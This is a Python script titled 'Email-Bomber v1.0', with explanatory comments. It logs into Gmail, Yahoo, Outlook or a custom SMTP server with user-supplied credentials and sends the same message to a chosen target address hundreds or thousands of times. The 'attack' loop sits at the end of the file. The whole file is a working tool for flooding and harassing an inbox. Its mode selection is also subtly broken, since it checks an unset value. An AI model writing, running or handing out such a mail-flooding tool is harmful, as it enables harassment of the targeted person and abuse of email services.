# FIRST import System Mail Transfer Protocol library, which allows for mailing operations
# Second import sys module, which allows us to exit program when needed, or if there's an error
# e.g. - print(sys.version) returns a String containing Python Interpreter info

'''imports'''
import smtplib
import sys


# Create "Bomb-colors" class to hold color values:

class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'


# Banner for our "BOMB" program, which has color class embedded in print statement for color:

def banner():
    print(bcolors.GREEN + "+[+[+[ Email-Bomber v1.0 ]+]+]+")
    print(bcolors.GREEN + "+[+[+[ made with codes ]+]+]+")
    print(bcolors.GREEN + ''' 
                    \|/
                       `--+--'
                          |
                      ,--'#`--.
                      |#######|
                   _.-'#######`-._
                ,-'###############`-.
              ,'#####################`,         .___     .__         .
             |#########################|        [__ ._ _ [__) _ ._ _ |_  _ ._.
            |###########################|       [___[ | )[__)(_)[ | )[_)(/,[
           |#############################|
           |#############################|              Author: Joseph
           |#############################|
            |###########################|
             \#########################/
              `.#####################,'
                `._###############_,'
                   `--..#####..--'                                 ,-.--.
*.______________________________________________________________,' (Bomb)
                                                                    `--' ''')

class Email_Bomber:

# Our class attribute
    count = 0
    
# Our class constructor
    def __init__(self):

# try/exception block to ensure there are no issues initially:

        try:
            print(bcolors.RED + '\n+[+[+[ Initializing program ]+]+]+')
            self.target = str(input(bcolors.GREEN + "Enter target email <: "))
            self.mode = int(input(bcolors.GREEN + "Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) <: "))
            if int(self.mode) > int(4) or int(self.mode) < 1:
                print("ERROR: Invalid Option. GoodBye.")
                sys.exit(1)

# Here we pick up any exceptions induced by user
        except Exception as e:
                print(f'ERROR: {e}')

    def bomb(self):
        try:
            print(bcolors.RED +'\n+[+[+[ Setting up bomb ]+]+]+')
            self.amount = None
            if self.amount == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.amount == int(3):
                self.amount = int(250)
            else:
                self.amount = int(input(bcolors.GREEN + 'Choose a CUSTOM amount <: '))
            print(bcolors.RED + f' +[+[+[ You have selected BOMB mode: {self.mode} and {self.amount} emails ]+]+]+')
        except Exception as e:

            print(f'ERROR: {e}')

    def email(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Setting up email ]+]+]+')

# Pre-made options listing Yahoo, Google, and Outlook since they all use the SAME port #

            self.server = str(input(bcolors.GREEN + 'Enter email server | or select premade options - 1:Gmail 2:Yahoo 3: Outlook <:'))
    
# Pre-made list of Strings created which correspond to our pre-made list

            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input(bcolors.GREEN + 'Enter port number <: '))

            if default_port == True:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.fromAddr = str(input(bcolors.GREEN + 'Enter from address <: '))
            self.fromPwd = str(input(bcolors.GREEN + 'Enter from password <: '))
            self.subject = str(input(bcolors.GREEN + 'Enter subject <: '))
            self.message = str(input(bcolors.GREEN + 'Enter message <: '))

# Formatting from address:

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
            ''' % (self.fromAddr, self.target, self.subject, self.message)

# Calling SMTP method, passing server and port number as arg parameter:

            self.s = smtplib.SMTP(self.server, self.port)

# Extended HELO (EHLO)-  command sent by an email server to identify itself when connecting to another email server
# to start the process of sending an email. It is followed with the sending email server's domain name.

            self.s.ehlo()

# This method is a protocol command used to inform the email server that the email client wants to upgrade from an
# insecure connection to a secure one using TLS or SSL:

            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'ERROR: {e}')
# Send funtion which takes sender's address, target address,and required message. Sends email:

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)

# Traces back to our count variable, which is our class attribute:

            self.count += 1
            print(bcolors.YELLOW + f'BOMB: {self.count}')
        except Exception as e:
            print(f'ERROR: {e}')

    def attack(self):
        print(bcolors.RED + '\n+[+[+[ Attacking... ]+]+]+')
        for email in range(self.amount + 1):
            self.send()
        self.s.close()
        print(bcolors.RED + '\n+[+[+[ Attacking finished ]+]+]+')
        sys.exit(0)

if __name__=='__main__':
    banner()
    bomb = Email_Bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()
    
